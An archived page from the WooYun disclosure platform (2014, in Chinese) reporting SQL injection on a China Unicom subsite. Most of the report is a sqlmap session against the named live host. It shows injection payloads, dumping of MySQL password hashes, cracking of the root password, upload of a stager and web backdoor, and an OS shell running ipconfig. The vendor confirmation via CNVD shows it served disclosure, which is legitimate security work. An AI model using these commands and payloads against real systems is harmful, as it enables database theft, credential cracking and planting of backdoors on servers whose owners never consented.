@@ -1,0 +1,316 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		联通某分站MySQL注入ROOT权限  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		联通某分站MySQL注入ROOT权限  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/belerhacker">belerhacker</a> 
+</li><li>提交时间：		2014-03-13 23:18</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-03-13：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-03-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-03-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-04-08：	细节向普通白帽子公开<br/>
+									2014-04-18：	细节向实习白帽子公开<br/>
+									2014-04-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">PHP + MYSQL注入，ROOT权限，可获得SHELL，接下来能做啥大家都知道了。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">在乌云看到这个漏洞 <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-049813">WooYun: 17WO手机验证码绕过可任意修改其他用户密码</a> 于是测试一下。漏洞依然存在，未修复。接着检查一下其他子域名的安全。<br />
+<br />
+<br />
+<br />
+百度搜索“site:17wo.cn”一下，得到可能的注入点：http://card.17wo.cn/wap/wap_card.php?id=2548<br />
+<br />
+<br />
+<br />
+扔给sqlmap跑一下：<br />
+<br />
+</p><pre><code>./sqlmap.py --random-agent --batch --thread 10 -u &#039;card.17wo.cn/wap/wap_card.php?id=2548&#039; --password<br />
+<br />
+    sqlmap/1.0-dev-ab36e5a - automatic SQL injection and database takeover tool<br />
+    http://sqlmap.org<br />
+<br />
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#039;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program<br />
+<br />
+[*] starting at 14:24:01<br />
+<br />
+[14:24:01] [INFO] fetched random HTTP User-Agent header from file &#039;/sqlmap/txt/user-agents.txt&#039;: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.2 Safari/530.5<br />
+[14:24:01] [INFO] resuming back-end DBMS &#039;mysql&#039;<br />
+[14:24:01] [INFO] testing connection to the target URL<br />
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:<br />
+---<br />
+Place: GET<br />
+Parameter: id<br />
+    Type: boolean-based blind<br />
+    Title: AND boolean-based blind - WHERE or HAVING clause<br />
+    Payload: id=2548 AND 1953=1953<br />
+<br />
+    Type: UNION query<br />
+    Title: MySQL UNION query (NULL) - 1 column<br />
+    Payload: id=2548 UNION ALL SELECT CONCAT(0x716c647471,0x796b6866457170574455,0x7165736271)#<br />
+<br />
+    Type: AND/OR time-based blind<br />
+    Title: MySQL &gt; 5.0.11 AND time-based blind<br />
+    Payload: id=2548 AND SLEEP(5)<br />
+---<br />
+[14:24:02] [INFO] the back-end DBMS is MySQL<br />
+web server operating system: Windows<br />
+web application technology: Apache 2.4.4, PHP 5.5.3<br />
+back-end DBMS: MySQL 5.0.11<br />
+[14:24:02] [INFO] fetching database users password hashes<br />
+[14:24:02] [WARNING] reflective value(s) found and filtering out<br />
+[14:24:02] [INFO] the SQL query used returns 6 entries<br />
+[14:24:02] [INFO] starting 6 threads<br />
+[14:24:02] [INFO] retrieved: &quot;root&quot;,&quot;*B80A3FB57E2E58C89333D9AEA9A624B1CB8C4520&quot;<br />
+[14:24:03] [INFO] retrieved: &quot;&quot;,&quot;&quot;<br />
+[14:24:03] [INFO] retrieved: &quot;pma&quot;,&quot;&quot;<br />
+[14:24:03] [INFO] retrieved: &quot;&quot;,&quot;&quot;<br />
+[14:24:03] [INFO] retrieved: &quot;root&quot;,&quot;*B80A3FB57E2E58C89333D9AEA9A624B1CB8C4520&quot;<br />
+[14:24:03] [INFO] retrieved: &quot;root&quot;,&quot;&quot;<br />
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N<br />
+do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y<br />
+[14:24:03] [INFO] using hash method &#039;mysql_passwd&#039;<br />
+what dictionary do you want to use?<br />
+[1] default dictionary file &#039;/sqlmap/txt/wordlist.zip&#039; (press Enter)<br />
+[2] custom dictionary file<br />
+[3] file with list of dictionary files<br />
+&gt; 1<br />
+[14:24:03] [INFO] using default dictionary<br />
+do you want to use common password suffixes? (slow!) [y/N] N<br />
+[14:24:03] [INFO] starting dictionary-based cracking (mysql_passwd)<br />
+[14:24:03] [INFO] starting 4 processes<br />
+[14:24:33] [INFO] cracked password &#039;wise&#039; for user &#039;root&#039;<br />
+database management system users password hashes:<br />
+[*] pma [1]:<br />
+    password hash: NULL<br />
+[*] root [2]:<br />
+    password hash: *B80A3FB57E2E58C89333D9AEA9A624B1CB8C4520<br />
+    clear-text password: wise<br />
+    password hash: NULL</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+直接跑出root密码。<br />
+<br />
+<br />
+<br />
+执行个命令试试：<br />
+<br />
+</p><pre><code>[14:26:46] [INFO] the back-end DBMS is MySQL<br />
+web server operating system: Windows<br />
+web application technology: Apache 2.4.4, PHP 5.5.3<br />
+back-end DBMS: MySQL 5.0.11<br />
+[14:26:46] [INFO] going to use a web backdoor for command prompt<br />
+[14:26:46] [INFO] fingerprinting the back-end DBMS operating system<br />
+[14:26:46] [WARNING] reflective value(s) found and filtering out<br />
+[14:26:46] [INFO] the back-end DBMS operating system is Windows<br />
+which web application language does the web server support?<br />
+[1] ASP<br />
+[2] ASPX<br />
+[3] JSP<br />
+[4] PHP (default)<br />
+&gt; 4<br />
+[14:26:46] [INFO] retrieved the web server document root: &#039;D:\xampp\htdocs\pailife&#039;<br />
+[14:26:46] [INFO] retrieved web server absolute paths: &#039;D:/xampp/htdocs/pailife/wap/wap_card.php&#039;<br />
+[14:26:46] [INFO] trying to upload the file stager on &#039;/&#039; via LIMIT INTO OUTFILE technique<br />
+[14:26:47] [WARNING] unable to upload the file stager on &#039;/&#039;<br />
+[14:26:47] [INFO] trying to upload the file stager on &#039;/&#039; via UNION technique<br />
+[14:26:48] [WARNING] expect junk characters inside the file as a leftover from UNION query<br />
+[14:26:48] [INFO] the remote file /tmpujmue.php is larger than the local file /var/folders/9g/xlxjdbd909d7z4lxrr51tj1m0000gn/T/tmpsx2Rm4<br />
+[14:26:50] [INFO] trying to upload the file stager on &#039;/wap&#039; via LIMIT INTO OUTFILE technique<br />
+[14:26:53] [WARNING] unable to upload the file stager on &#039;/wap&#039;<br />
+[14:26:53] [INFO] trying to upload the file stager on &#039;/wap&#039; via UNION technique<br />
+[14:26:59] [WARNING] it looks like the file has not been written, this can occur if the DBMS process&#039; user has no write privileges in the destination path<br />
+[14:27:00] [INFO] trying to upload the file stager on &#039;/xampp/htdocs/pailife/wap&#039; via LIMIT INTO OUTFILE technique<br />
+[14:27:03] [INFO] heuristics detected web page charset &#039;utf-8&#039;<br />
+[14:27:03] [INFO] the file stager has been successfully uploaded on &#039;/xampp/htdocs/pailife/wap&#039; - http://card.17wo.cn:80/wap/tmpujmue.php<br />
+[14:27:06] [INFO] heuristics detected web page charset &#039;ascii&#039;<br />
+[14:27:06] [INFO] the backdoor has been successfully uploaded on &#039;/xampp/htdocs/pailife/wap&#039; - http://card.17wo.cn:80/wap/tmpboyhw.php<br />
+[14:27:06] [INFO] calling OS shell. To quit type &#039;x&#039; or &#039;q&#039; and press ENTER<br />
+os-shell&gt; ipconfig<br />
+do you want to retrieve the command standard output? [Y/n/a] Y<br />
+[14:27:17] [INFO] heuristics detected web page charset &#039;GB2312&#039;<br />
+command standard output:<br />
+---<br />
+<br />
+Windows IP 配置<br />
+<br />
+<br />
+以太网适配器 本地连接:<br />
+<br />
+   连接特定的 DNS 后缀 . . . . . . . :<br />
+   本地链接 IPv6 地址. . . . . . . . : fe80::3cf0:d229:52:6821<br />
+   IPv4 地址 . . . . . . . . . . . . : 10.123.176.75<br />
+   子网掩码  . . . . . . . . . . . . : 255.255.255.224<br />
+   默认网关. . . . . . . . . . . . . : 10.123.176.67<br />
+<br />
+隧道适配器 本地连接* 4:<br />
+<br />
+   连接特定的 DNS 后缀 . . . . . . . :<br />
+   IPv6 地址 . . . . . . . . . . . . : 2001:0:9d38:6ab8:b0:7d8:f584:4fb4<br />
+   本地链接 IPv6 地址. . . . . . . . : fe80::b0:7d8:f584:4fb4<br />
+   默认网关. . . . . . . . . . . . . : ::<br />
+<br />
+隧道适配器 isatap.{DD9307C7-D162-4559-AFA6-28E9AA162058}:<br />
+<br />
+   媒体状态  . . . . . . . . . . . . : 媒体已断开<br />
+   连接特定的 DNS 后缀 . . . . . . . :<br />
+---</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+完全没问题。<br />
+<br />
+<br />
+<br />
+接下来就啥都能做了...<br />
+<br />
+<br />
+<br />
+发漏洞之前在乌云搜了一下，发现去年就有人提相关漏洞。直到现在大半年都没修复。此漏洞权当再次给当事人提个醒吧。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">其一提高安全意识(那么久的漏洞都不修)，其次防注入，降低权限... </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/belerhacker" title="belerhacker">belerhacker</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-053568" title="联通某分站MySQL注入ROOT权限">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：12 </p>
+													<p class="detail">确认时间：2014-03-19 10:09</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认并复现所述情况，已经转由CNCERT直接通报给中国联通集团公司处置。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="53568";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
